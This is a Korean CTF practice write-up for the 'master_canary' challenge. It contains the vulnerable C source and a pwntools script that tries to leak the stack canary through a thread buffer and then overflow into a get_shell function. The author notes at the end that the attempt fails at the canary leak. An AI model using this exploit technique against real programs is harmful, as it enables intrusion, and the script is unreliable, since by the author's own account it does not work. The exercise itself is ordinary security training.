# master_canary  

**실습환경**
```
Ubuntu 16.04
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```



**master_canary.c**
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>

char *global_buffer;

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

void *thread_routine() {
    char buf[256];

    global_buffer = buf;
}

void read_bytes(char *buf, size_t size) {
    size_t sz = 0;
    size_t idx = 0;
    size_t tmp;

    while (sz < size) {
        tmp = read(0, &buf[idx], 1);
        if (tmp != 1) {
            exit(-1);
        }
        idx += 1;
        sz += 1;
    }
    return;
}

int main(int argc, char *argv[]) {
    size_t size = 0;
    pthread_t thread_t;
    int idx = 0;
    char leave_comment[32];

    initialize();

    while (1) {
        printf("1. Create thread\n");
        printf("2. Input\n");
        printf("3. Exit\n");
        printf("> ");
        scanf("%d", &idx);

        switch (idx) {
            case 1:
                if (pthread_create(&thread_t, NULL, thread_routine, NULL) < 0) {
                    perror("thread create error");
                    exit(0);
                }
                break;
            case 2:
                printf("Size: ");
                scanf("%lu", &size);

                printf("Data: ");
                read_bytes(global_buffer, size);

                printf("Data: %s", global_buffer);
                break;
            case 3:
                printf("Leave comment: ");
                read(0, leave_comment, 1024);
                return 0;
            default:
                printf("Nope\n");
                break;
        }
    }

    return 0;
}
```




b*main+336


<img width="1436" height="703" alt="image" src="https://github.com/user-attachments/assets/84e370e2-d6d9-45e8-8159-9347ec97db3a" />

<img width="1433" height="1067" alt="image" src="https://github.com/user-attachments/assets/64ad188b-3f33-41c0-91cd-2b84bb7a1242" />


<img width="1424" height="1066" alt="image" src="https://github.com/user-attachments/assets/c5ded89f-d637-4ffc-9699-088a5c77c029" />



```python
from pwn import *

p = process('./master_canary')
e = ELF('./master_canary')

getshell_addr = e.symbols['get_shell']

p.sendlineafter(b'> ', b'1')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Size: ', b'144')

p.recvuntil(b'Data: ')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'Size: ', b'144')

payload = b'A'*136 + b'B' 
p.send(payload)

p.recvuntil(b'B')
leaked = p.recv(7)
canary = u64(b'\x00' + leaked)

p.sendlineafter(b'> ', b'3')

payload2 = b'A'*40
payload2 += p64(canary)
payload2 += b'B'*8
payload2 += p64(getshell_addr)

p.sendlineafter(b'comment: ', payload2)

p.interactive()

```


-> 실패 무한 반복  
-> canary leak 에서 오류 
